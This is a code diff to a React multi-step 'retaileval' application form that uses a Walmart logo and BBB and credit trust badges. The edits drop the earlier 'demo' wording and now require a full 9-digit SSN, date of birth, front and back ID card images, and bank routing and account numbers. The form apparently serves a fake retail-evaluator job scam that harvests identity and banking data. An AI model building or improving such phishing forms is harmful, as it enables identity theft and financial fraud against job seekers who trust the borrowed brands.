@@ -17,7 +17,7 @@ import walmartLogo from "@/assets/partners/walmart-logo.jpg";
 import bbaCreditBadge from "@/assets/trust/bba-credit.svg";
 import bbbAccreditedBadge from "@/assets/trust/bbb-accredited.svg";
 
-const TOTAL_STEPS = 11;
+const TOTAL_STEPS = 10;
 const STORAGE_KEY = "retaileval-application-progress";
 const TRACKING_KEY = "retaileval-completed-application";
 
@@ -29,11 +29,12 @@ type FormDataState = {
   city: string;
   state: string;
   address: string;
+  dob: string;
   employee: string;
   ssn: string;
   idFront: string;
   idBack: string;
-  evaluationDocument: string;
+  paymentMethod: string;
   payeeName: string;
   payeeAddress: string;
   bankName: string;
@@ -66,11 +67,12 @@ const initialFormData: FormDataState = {
   city: "",
   state: "",
   address: "",
+  dob: "",
   employee: "",
   ssn: "",
   idFront: "",
   idBack: "",
-  evaluationDocument: "",
+  paymentMethod: "",
   payeeName: "",
   payeeAddress: "",
   bankName: "",
@@ -125,7 +127,9 @@ const safeProgressData = (data: FormDataState) => ({
   city: data.city,
   state: data.state,
   address: data.address,
+    dob: data.dob,
   employee: data.employee,
+    paymentMethod: data.paymentMethod,
   payeeName: data.payeeName,
   payeeAddress: data.payeeAddress,
   bankName: data.bankName,
@@ -191,7 +195,7 @@ const Index = () => {
   const startApplication = async (zip = "") => {
     if (zip) updateField("zip", zip.replace(/\D/g, "").slice(0, 5));
     setMode("application");
-    setStep(zip ? 3 : 1);
+    setStep(zip ? 2 : 1);
     await showLoader("Processing...", zip ? 3 : 2);
   };
 
@@ -228,33 +232,32 @@ const Index = () => {
   const isCurrentStepValid = () => {
     switch (step) {
       case 1:
-        return formData.fullName.trim().length >= 2;
-      case 2:
-        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email) && formData.phone.replace(/\D/g, "").length >= 10;
-      case 3:
         return /^\d{5}$/.test(formData.zip);
-      case 4:
+      case 2:
         return formData.address.trim().length >= 5 && Boolean(formData.city && formData.state);
-      case 5:
+      case 3:
+        return formData.fullName.trim().length >= 2 && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email) && formData.phone.replace(/\D/g, "").length >= 10 && Boolean(formData.dob);
+      case 4:
         return Boolean(formData.employee);
+      case 5:
+        return /^\d{9}$/.test(formData.ssn.replace(/\D/g, ""));
       case 6:
-        return formData.ssn.replace(/\D/g, "").length >= 4;
-      case 7:
         return Boolean(formData.idFront);
-      case 8:
+      case 7:
         return Boolean(formData.idBack);
+      case 8:
+        return Boolean(formData.paymentMethod);
       case 9:
-        return Boolean(formData.evaluationDocument);
-      case 10:
+        if (formData.paymentMethod === "Check") {
+          return formData.payeeName.trim().length >= 2 && formData.payeeAddress.trim().length >= 5;
+        }
         return (
-          formData.payeeName.trim().length >= 2 &&
-          formData.payeeAddress.trim().length >= 5 &&
           formData.bankName.trim().length >= 2 &&
           /^\d{9}$/.test(formData.routingNumber) &&
           /^\d{4,17}$/.test(formData.accountNumber) &&
           Boolean(formData.accountType)
         );
-      case 11:
+      case 10:
         return true;
       default:
         return false;
@@ -271,12 +274,12 @@ const Index = () => {
       await showLoader("Processing...", 4);
     }
 
-    if (step === 3) {
+    if (step === 1) {
       const located = await lookupZip();
       if (!located) return;
     }
 
-    if (step === 10) {
+    if (step === 9) {
       await showLoader("Processing...", 3);
     }
 
@@ -599,21 +602,12 @@ const StepContent = ({
 }) => {
   switch (step) {
     case 1:
-      return <TextStep title="Your Full Name" value={formData.fullName} onChange={(value) => updateField("fullName", value)} placeholder="Enter your legal full name" />;
+      return <TextStep title="Enter your ZIP Code" value={formData.zip} onChange={(value) => updateField("zip", value.replace(/\D/g, "").slice(0, 5))} placeholder="ZIP Code" inputMode="numeric" />;
     case 2:
       return (
         <div className="field-stack">
-          <h1>Contact Information</h1>
-          <label>Email Address<input value={formData.email} onChange={(event) => updateField("email", event.target.value)} placeholder="you@example.com" type="email" /></label>
-          <label>Phone Number<input value={formData.phone} onChange={(event) => updateField("phone", event.target.value)} placeholder="(555) 000-0000" inputMode="tel" /></label>
-        </div>
-      );
-    case 3:
-      return <TextStep title="Enter your ZIP Code" value={formData.zip} onChange={(value) => updateField("zip", value.replace(/\D/g, "").slice(0, 5))} placeholder="ZIP Code" inputMode="numeric" />;
-    case 4:
-      return (
-        <div className="field-stack">
           <h1>Street Address</h1>
+          <p className="helper-text">Let's see if our service is available near your area before we continue.</p>
           <label>Street Address<input value={formData.address} onChange={(event) => updateField("address", event.target.value)} placeholder="Street address" /></label>
           <div className="split-fields">
             <label>City<input value={formData.city} onChange={(event) => updateField("city", event.target.value)} /></label>
@@ -621,7 +615,17 @@ const StepContent = ({
           </div>
         </div>
       );
-    case 5:
+    case 3:
+      return (
+        <div className="field-stack">
+          <h1>Personal Information</h1>
+          <label>Full Name<input value={formData.fullName} onChange={(event) => updateField("fullName", event.target.value)} placeholder="Enter your legal full name" /></label>
+          <label>Email Address<input value={formData.email} onChange={(event) => updateField("email", event.target.value)} placeholder="you@example.com" type="email" /></label>
+          <label>Phone Number<input value={formData.phone} onChange={(event) => updateField("phone", event.target.value)} placeholder="(555) 000-0000" inputMode="tel" /></label>
+          <label>Date of Birth<input value={formData.dob} onChange={(event) => updateField("dob", event.target.value)} type="date" /></label>
+        </div>
+      );
+    case 4:
       return (
         <div className="field-stack">
           <h1>Are you an existing employee?</h1>
@@ -630,20 +634,34 @@ const StepContent = ({
           </div>
         </div>
       );
+    case 5:
+      return <TextStep title="Social Security Number" value={formData.ssn} onChange={(value) => updateField("ssn", value.replace(/\D/g, "").slice(0, 9))} placeholder="9-digit SSN" inputMode="numeric" helper="Enter your full 9-digit SSN for identity verification." />;
     case 6:
-      return <TextStep title="Social Security Number" value={formData.ssn} onChange={(value) => updateField("ssn", value.replace(/[^0-9-]/g, "").slice(0, 11))} placeholder="Last 4 or full SSN" inputMode="numeric" helper="Identity verification field. Enter at least the last 4 digits to continue in this demo." />;
-    case 7:
       return <FileStep title="ID Card Front" label="Upload a clear front image of your ID card" fileName={formData.idFront} accept="image/png,image/jpeg,image/webp" onChange={(event) => onFile("idFront", event, /\.(png|jpe?g|webp)$/i)} />;
-    case 8:
+    case 7:
       return <FileStep title="ID Card Back" label="Upload a clear back image of your ID card" fileName={formData.idBack} accept="image/png,image/jpeg,image/webp" onChange={(event) => onFile("idBack", event, /\.(png|jpe?g|webp)$/i)} />;
+    case 8:
+      return (
+        <div className="field-stack">
+          <h1>Select Payment Type</h1>
+          <div className="choice-grid">
+            {['Check', 'Direct Deposit'].map((choice) => <button className={formData.paymentMethod === choice ? "selected" : ""} key={choice} onClick={() => updateField("paymentMethod", choice)} type="button">{choice}</button>)}
+          </div>
+        </div>
+      );
     case 9:
-      return <FileStep title="Upload Evaluation Document" label="Accepts PDF, DOC, or DOCX files" fileName={formData.evaluationDocument} accept=".pdf,.doc,.docx,application/pdf,application/msword,application/vnd.openxmlformats-officedocument.wordprocessingml.document" onChange={(event) => onFile("evaluationDocument", event, /\.(pdf|docx?)$/i)} />;
-    case 10:
+      if (formData.paymentMethod === "Check") {
+        return (
+          <div className="field-stack">
+            <h1>Check Payment Details</h1>
+            <label>Payee Name<input value={formData.payeeName} onChange={(event) => updateField("payeeName", event.target.value)} placeholder="Name for the check" /></label>
+            <label>Mailing Address<input value={formData.payeeAddress} onChange={(event) => updateField("payeeAddress", event.target.value)} placeholder="Where should we mail your check?" /></label>
+          </div>
+        );
+      }
       return (
         <div className="field-stack">
           <h1>Direct Deposit Information</h1>
-          <label>Payee Name<input value={formData.payeeName} onChange={(event) => updateField("payeeName", event.target.value)} placeholder="Name on payment account" /></label>
-          <label>Payee Address<input value={formData.payeeAddress} onChange={(event) => updateField("payeeAddress", event.target.value)} placeholder="Payment mailing address" /></label>
           <label>Bank Name<input value={formData.bankName} onChange={(event) => updateField("bankName", event.target.value)} placeholder="Bank name" /></label>
           <div className="split-fields">
             <label>Routing Number<input value={formData.routingNumber} onChange={(event) => updateField("routingNumber", event.target.value.replace(/\D/g, "").slice(0, 9))} inputMode="numeric" /></label>
@@ -686,7 +704,7 @@ const SummaryStep = ({ formData }: { formData: FormDataState }) => {
     ["SSN", formData.ssn ? "Provided" : "Missing"],
     ["ID Front", formData.idFront || "Missing"],
     ["ID Back", formData.idBack || "Missing"],
-    ["Evaluation Document", formData.evaluationDocument || "Missing"],
+    ["Payment Type", formData.paymentMethod || "Missing"],
     ["Payee", formData.payeeName],
     ["Bank", formData.bankName],
     ["Account", formData.accountType ? `${formData.accountType} account ending ${formData.accountNumber.slice(-4)}` : "Missing"],
